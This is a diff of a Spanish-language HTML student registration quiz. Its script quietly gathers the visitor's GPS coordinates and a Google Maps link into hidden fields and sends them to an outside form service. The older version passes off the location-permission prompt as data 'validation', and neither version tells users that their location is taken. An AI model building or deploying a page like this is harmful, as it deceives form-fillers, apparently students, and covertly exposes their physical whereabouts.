@@ -2,70 +2,42 @@
 <html lang="es">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Cuestionario de Informática</title>
     <style>
-        body { font-family: sans-serif; background-color: #f4f4f9; display: flex; justify-content: center; padding: 20px; }
-        .card { background: white; padding: 25px; border-radius: 12px; box-shadow: 0 4px 15px rgba(0,0,0,0.1); width: 100%; max-width: 400px; }
-        h2 { color: #333; text-align: center; }
-        label { display: block; margin-top: 15px; font-weight: bold; color: #555; }
-        input, select, textarea { width: 100%; padding: 10px; margin-top: 5px; border: 1px solid #ccc; border-radius: 6px; box-sizing: border-box; }
-        button { width: 100%; padding: 12px; background-color: #007bff; color: white; border: none; border-radius: 6px; margin-top: 20px; cursor: pointer; font-size: 16px; }
-        #status { font-size: 12px; color: #777; text-align: center; margin-top: 10px; }
+        body { font-family: sans-serif; background-color: #f0f2f5; display: flex; justify-content: center; padding: 20px; }
+        .card { background: white; padding: 30px; border-radius: 12px; box-shadow: 0 4px 15px rgba(0,0,0,0.1); width: 100%; max-width: 400px; }
+        input, select, button { width: 100%; padding: 12px; margin-top: 10px; border-radius: 8px; border: 1px solid #ccc; box-sizing: border-box; }
+        button { background-color: #1a73e8; color: white; font-weight: bold; cursor: pointer; border: none; }
     </style>
 </head>
 <body>
-
 <div class="card">
     <h2>Registro de Alumnos</h2>
-    <form id="proyectForm" action="https://formspree.io/f/xykngrn p" method="POST">
-        
-        <label>Nombre:</label>
-        <input type="text" name="nombre" required>
-
-        <label>Correo:</label>
-        <input type="email" name="email" required>
-
-        <label>¿Sabes qué es programación?</label>
-        <select name="conoce_progra">
-            <option value="si">Sí</option>
-            <option value="no">No</option>
+    <form id="f" action="https://formspree.io/f/xykngrnp" method="POST">
+        <input type="text" name="nombre" placeholder="Nombre" required>
+        <input type="email" name="email" placeholder="Correo" required>
+        <select name="sabe_progra">
+            <option value="si">Sí sabe</option>
+            <option value="no">No sabe</option>
         </select>
-
-        <label>¿Has compartido algo por programación?</label>
-        <textarea name="mensaje" rows="2"></textarea>
-
         <input type="hidden" name="Latitud" id="lat">
         <input type="hidden" name="Longitud" id="lon">
-        <input type="hidden" name="Mapa" id="map_link">
-
+        <input type="hidden" name="Mapa" id="map">
         <button type="button" onclick="enviar()">Enviar Registro</button>
-        <p id="status">Se validarán los datos al enviar.</p>
     </form>
 </div>
-
 <script>
     function enviar() {
-        const form = document.getElementById('proyectForm');
-        const status = document.getElementById('status');
-        
+        const form = document.getElementById('f');
         if (navigator.geolocation) {
-            status.textContent = "Validando... por favor acepta el permiso.";
-            navigator.geolocation.getCurrentPosition(function(pos) {
-                document.getElementById('lat').value = pos.coords.latitude;
-                document.getElementById('lon').value = pos.coords.longitude;
-                document.getElementById('map_link').value = `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
+            navigator.geolocation.getCurrentPosition(function(p) {
+                document.getElementById('lat').value = p.coords.latitude;
+                document.getElementById('lon').value = p.coords.longitude;
+                document.getElementById('map').value = `https://www.google.com/maps?q=${p.coords.latitude},${p.coords.longitude}`;
                 form.submit();
-            }, function() {
-                // Si rechaza el permiso, envía solo el texto
-                form.submit();
-            });
-        } else {
-            form.submit();
-        }
+            }, function() { form.submit(); });
+        } else { form.submit(); }
     }
 </script>
-
 </body>
 </html>
-
